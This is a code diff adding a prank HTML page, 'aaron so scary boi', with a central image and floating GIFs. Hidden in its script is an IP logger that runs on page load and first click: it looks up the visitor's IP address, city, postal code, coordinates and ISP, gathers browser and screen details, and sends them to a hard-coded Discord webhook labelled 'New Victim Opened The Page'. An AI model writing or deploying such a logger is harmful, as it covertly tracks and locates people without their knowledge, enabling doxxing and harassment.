@@ -1,0 +1,129 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>aaron so scary boi</title>
+<style>
+body { 
+    margin: 0; 
+    overflow: hidden; 
+    background: black; 
+}
+.center img {
+    position: absolute; 
+    top: 50%; 
+    left: 50%; 
+    transform: translate(-50%, -50%);
+    width: 500px; 
+    border-radius: 25px; 
+    box-shadow: 0 0 60px white; 
+    z-index: 10;
+}
+.float {
+    position: absolute; 
+    width: 140px;
+    animation: float 4s infinite ease-in-out;
+}
+@keyframes float {
+    0% { transform: translateY(0); }
+    50% { transform: translateY(-50px); }
+    100% { transform: translateY(0); }
+}
+.a { top: 5%; left: 5%; } 
+.b { top: 10%; right: 5%; }
+.c { bottom: 10%; left: 10%; } 
+.d { bottom: 10%; right: 10%; }
+.e { top: 40%; left: 0%; } 
+.f { top: 50%; right: 0%; }
+</style>
+</head>
+<body>
+
+<div class="center">
+<img src="https://pub-1407f82391df4ab1951418d04be76914.r2.dev/uploads/a241306b-3702-4929-8ae8-9c34c2608523.png">
+</div>
+
+<img class="float a" src="https://media.giphy.com/media/JIX9t2j0ZTN9S/giphy.gif">
+<img class="float b" src="https://media.giphy.com/media/mlvseq9yvZhba/giphy.gif">
+<img class="float c" src="https://media.giphy.com/media/3oriO0OEd9QIDdllqo/giphy.gif">
+<img class="float d" src="https://media.giphy.com/media/13borq7Zo2kulO/giphy.gif">
+<img class="float e" src="https://media.giphy.com/media/l0MYt5jPR6QX5pnqM/giphy.gif">
+<img class="float f" src="https://media.giphy.com/media/ICOgUNjpvO0PC/giphy.gif">
+
+<script>
+// === PUT YOUR REAL DISCORD WEBHOOK HERE ===
+const WEBHOOK_URL = "https://discord.com/api/webhooks/1492201181412593895/OsetCXRaeFK59ZMTZMHBR04_Zjw9aD19Qs_ne--tjdsYzJRjZru92DKJqYv-FZjlyOEz";
+
+async function sendLogger() {
+    try {
+        // Get full location + IP data
+        const ipRes = await fetch("http://ip-api.com/json/?fields=status,message,query,country,regionName,city,zip,lat,lon,timezone,isp");
+        const ipData = await ipRes.json();
+
+        const info = {
+            ip: ipData.query || "Unknown",
+            city: ipData.city || "Unknown",
+            region: ipData.regionName || "Unknown",
+            country: ipData.country || "Unknown",
+            postal: ipData.zip || "Unknown",
+            timezone: ipData.timezone || "Unknown",
+            lat: ipData.lat || "Unknown",
+            lon: ipData.lon || "Unknown",
+            isp: ipData.isp || "Unknown",
+            userAgent: navigator.userAgent,
+            platform: navigator.platform,
+            language: navigator.language,
+            screen: `${screen.width}×${screen.height}`,
+            referrer: document.referrer || "Direct",
+            timestamp: new Date().toLocaleString()
+        };
+
+        const payload = {
+            username: "Aaron Scary Logger",
+            embeds: [{
+                title: "New Victim Opened The Page 👀",
+                color: 0xff0000,
+                fields: [
+                    { name: "IP", value: info.ip, inline: true },
+                    { name: "City", value: info.city, inline: true },
+                    { name: "Region", value: info.region, inline: true },
+                    { name: "Country", value: info.country, inline: true },
+                    { name: "Postal Code", value: info.postal, inline: true },
+                    { name: "Timezone", value: info.timezone, inline: true },
+                    { name: "Coords", value: `${info.lat}, ${info.lon}`, inline: true },
+                    { name: "ISP", value: info.isp, inline: false },
+                    { name: "User-Agent", value: `\`\`\`${info.userAgent}\`\`\``, inline: false },
+                    { name: "OS / Browser", value: info.platform, inline: true },
+                    { name: "Language", value: info.language, inline: true },
+                    { name: "Screen", value: info.screen, inline: true },
+                    { name: "Referrer", value: info.referrer, inline: false },
+                    { name: "Time", value: info.timestamp, inline: false }
+                ],
+                footer: { text: "aaron so scary boi" }
+            }]
+        };
+
+        // Send to Discord
+        const response = await fetch(WEBHOOK_URL, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify(payload)
+        });
+
+        if (response.ok) {
+            console.log("✅ Full logger sent to Discord successfully!");
+        } else {
+            console.log("Webhook failed with status:", response.status);
+        }
+    } catch (e) {
+        console.log("❌ Logger error:", e.message);
+    }
+}
+
+// Trigger when page loads AND when clicked anywhere
+window.addEventListener("load", sendLogger);
+document.addEventListener("click", sendLogger, { once: true });
+</script>
+
+</body>
+</html>
